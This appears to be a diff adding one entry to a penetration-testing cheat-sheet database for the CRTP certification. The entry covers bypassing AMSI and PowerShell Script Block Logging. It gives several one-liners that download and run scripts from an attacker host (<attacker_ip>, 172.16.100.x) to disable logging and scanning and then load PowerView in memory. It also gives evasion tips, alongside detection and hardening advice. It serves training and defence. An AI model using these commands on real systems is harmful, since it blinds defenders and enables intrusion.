@@ -1,0 +1,110 @@
+{
+  "id": "crtp-amsi-sbl-bypass",
+  "name": "AMSI & Script Block Logging Bypass (one-liner)",
+  "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/<amsi_bypass>.txt')",
+  "description": "Download-and-execute one-liners that patch AMSI (AmsiScanBuffer) and disable Script Block Logging in the current PowerShell session before loading offensive scripts. In CRTP these are served as sbloggingbypass.txt and Amsi-Byp.txt and iex'd in-memory so nothing hits disk and script content is not logged.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Evasion",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1562.001",
+    "T1059.001",
+    "T1140"
+  ],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "amsi-bypass",
+    "script-block-logging",
+    "in-memory",
+    "evasion",
+    "powershell",
+    "crtp"
+  ],
+  "variations": [
+    {
+      "label": "Script Block Logging bypass",
+      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/sbloggingbypass.txt')"
+    },
+    {
+      "label": "AMSI bypass",
+      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/Amsi-Byp.txt')"
+    },
+    {
+      "label": "Then load a tool in-memory",
+      "command": "iex (New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/PowerView.ps1')"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Disable Script Block Logging",
+      "command": "iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')"
+    },
+    {
+      "label": "Disable AMSI",
+      "command": "iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')"
+    },
+    {
+      "label": "Load PowerView fileless",
+      "command": "iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Full three-step in-memory load",
+      "command": "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt)\niex (iwr -UseBasicParsing http://172.16.100.x/Amsi-Byp.txt)\niex (iwr -UseBasicParsing http://172.16.100.x/PowerView.ps1)"
+    }
+  ],
+  "notes": "Order matters: disable Script Block Logging first, then AMSI, then load tooling - so the bypass scripts themselves aren't logged. These are session-scoped (per powershell.exe). InviShell (crtp-invishell) achieves the same via COR_PROFILER without hosting files; Loader.exe (crtp-loader) is the equivalent for .NET assemblies. Bypass strings are signatured - obfuscate/rehost when caught.",
+  "references": [
+    {
+      "title": "CRTP - Attacking and Defending AD (lab)",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "MITRE ATT&CK T1562.001 - Impair Defenses",
+      "url": "https://attack.mitre.org/techniques/T1562/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-invishell",
+      "note": "Fileless alternative via COR_PROFILER (no hosting needed)",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-powerview-users-groups",
+      "note": "Load PowerView after the bypass and enumerate",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-loader",
+      "note": "Use Loader.exe for .NET assemblies (Rubeus/SafetyKatz)",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "prerequisites": "PowerShell execution and a reachable web host serving the bypass scripts (or the strings pasted inline).",
+    "why_it_works": "AMSI's AmsiScanBuffer and PowerShell's Script Block Logging both run in-process; a script executing in that session can patch the AMSI function pointer/return value and flip the ScriptBlockLogging setting cached in the ETW provider, so subsequent commands are neither scanned nor logged. Downloading via WebClient/iwr and iex keeps everything in memory.",
+    "misconfiguration": "AMSI + Script Block Logging trusted as the only PowerShell defense; no Constrained Language Mode; egress to arbitrary HTTP allowed; no alert on logging going silent.",
+    "impact": "Offensive PowerShell (PowerView, PowerUp, Invoke-Mimikatz) runs unscanned and unlogged in the session - the primary PowerShell telemetry is blinded before the real tooling loads.",
+    "detection": "The FIRST download-string/iex is usually still logged (before the bypass lands) - alert on iex + DownloadString/iwr to raw .txt. Sudden stop of 4104 events mid-session. AMSI 'AMSI_RESULT' anomalies; amsi.dll memory patch detected by ETW-TI EDR. Network: PowerShell process fetching .txt/.ps1 over HTTP.",
+    "artifacts": "Proxy/EDR record of powershell.exe GET to bypass .txt; a lone 4104 for the bypass one-liner followed by silence; RW patch of amsi.dll in process memory.",
+    "vulnerable_config": "# Full Language Mode PowerShell, AMSI on but no ETW-TI EDR\n# Unrestricted HTTP egress; logging not shipped/alerted on silence",
+    "secure_config": "# PowerShell Constrained Language Mode (blocks Add-Type/reflection tricks)\n# WDAC enforce so only signed scripts run\n# ETW-TI EDR to catch amsi.dll patching\n# Ship 4104 to SIEM; alert when a session logs the bypass one-liner or goes silent\n# Egress filtering / proxy allowlist",
+    "prevention": "Enforce Constrained Language Mode + WDAC signed-only. Use EDR with ETW-TI to detect AMSI patching. Alert on iex+DownloadString and on Script Block Logging silence. Restrict outbound HTTP. [MITRE M1042, M1038, M1040]",
+    "evasion": "Disable logging before AMSI so the bypass itself isn't captured; obfuscate the bypass strings; host on an internal IP; deliver inline instead of over HTTP.",
+    "sources": [
+      "CRTP",
+      "MITRE T1562.001",
+      "MITRE T1059.001"
+    ]
+  }
+}
